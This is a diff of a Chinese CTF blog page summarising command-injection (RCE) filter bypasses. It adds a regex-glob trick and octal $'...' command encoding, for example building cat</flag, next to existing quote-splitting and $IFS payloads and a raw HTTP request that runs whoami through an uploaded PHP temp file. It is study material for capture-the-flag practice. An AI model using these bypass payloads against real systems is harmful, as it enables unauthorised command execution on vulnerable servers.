@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://www.dr0n.top/img/summary/rce-14.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/rce-15.png">
 <meta property="article:published_time" content="2023-01-10T03:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-27T06:19:45.229Z">
+<meta property="article:modified_time" content="2024-04-27T13:03:38.833Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="rce">
@@ -265,7 +265,7 @@
         
         
         
-          150 分钟
+          154 分钟
         
       </span>
     
@@ -328,7 +328,10 @@
 <h1 id="整体可控"><a href="#整体可控" class="headerlink" title="整体可控"></a>整体可控</h1><h2 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h2><p>比赛中较为常见的一种类型，将关键词替换成空或其他字符<br>如果只替换成空可以利用双写绕过，如果是替换成字符那么可以用base64编码绕过或者拼接变量</p>
 <p>常见的读取文件的命令：<code>cat</code>,<code>tac</code>,<code>od</code>,<code>nl</code>,<code>less</code>,<code>more</code>,<code>sed p</code>,<code>head</code>,<code>tail</code>,<code>sort</code>,<code>uniq</code>,<code>file -f</code>,<code>date -f</code><br>常见的列目录的命令：<code>ls</code>,<code>du</code><br>常用的还有通配符<code>*</code>和<code>?</code></p>
 <p>黑名单还可以采用一些不影响执行的特定符号隔开检测的关键字</p>
-<p>比如<br><code>cat /flag</code>–&gt;<code>ca&#39;&#39;t /flag</code>–&gt;<code>ca&quot;&quot;t /flag</code>–&gt;<code>ca\t /flag</code>–&gt;<code>ca$1t /flag</code>–&gt;<code>ca$IFS$1t /flag</code></p>
+<p>比如</p>
+<p><code>cat /flag</code>–&gt;<code>ca&#39;&#39;t /flag</code>–&gt;<code>ca&quot;&quot;t /flag</code>–&gt;<code>ca\t /flag</code>–&gt;<code>ca$1t /flag</code>–&gt;<code>ca$IFS$1t /flag</code></p>
+<p>或者正则，<code>[^a]代表不是a的其他字符</code></p>
+<p><code>more [^a][^a][^m][^b]</code></p>
 <h2 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h2><p>符号过滤也非常常见</p>
 <p>比如可以用<code>&lt;&gt;</code>,<code>$&#123;IFS&#125;</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>等代替空格</p>
 <p>再者，可以利用变量来截取</p>
@@ -345,6 +348,15 @@
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /?cmd=.%20/???/????????[@-[] HTTP/1.1<br>Host: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080<br>Content-Length: 421<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Origin: http://192.168.1.17<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3b<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://192.168.1.17/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close<br><br>------WebKitFormBoundaryIoD8zFE5URcUFT3b<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;<br>Content-Type: text/html<br><br><br>whoami<br>------WebKitFormBoundaryIoD8zFE5URcUFT3b--<br><br></code></pre></td></tr></table></figure>
 
 <p><img src="/img/summary/rce-1.png"></p>
+<h1 id="数字命令执行"><a href="#数字命令执行" class="headerlink" title="$数字命令执行"></a>$数字命令执行</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>];<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>linux中使用$’xxx’（xxx为字符的八进制）的形式可以执行任意代码</p>
+</blockquote>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$<span class="hljs-string">&#x27;\154\163&#x27;</span>  <span class="hljs-comment">//ls</span><br>$<span class="hljs-string">&#x27;\143\141\164&#x27;</span>&lt;$<span class="hljs-string">&#x27;\57\146\154\141\147&#x27;</span>  <span class="hljs-comment">// cat&lt;/flag</span><br></code></pre></td></tr></table></figure>
+
+<p>构造脚本<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck">bashFuck</a></p>
 <h1 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h1><h2 id="7字符长度的命令执行"><a href="#7字符长度的命令执行" class="headerlink" title="7字符长度的命令执行"></a>7字符长度的命令执行</h2><h3 id="web目录可写"><a href="#web目录可写" class="headerlink" title="web目录可写"></a>web目录可写</h3><p>可写的情况主要利用<code>&gt;</code>写入shell到文件名中，然后利用<code>ls -t</code>命令排序，写入文件后用<code>.</code>执行。具体思路如下</p>
 <p>在<code>linux</code>中，可以利用<code>&gt;aa</code>创建一个文件，文件名就是<code>aa</code></p>
 <p><img src="/img/summary/rce-2.png"></p>
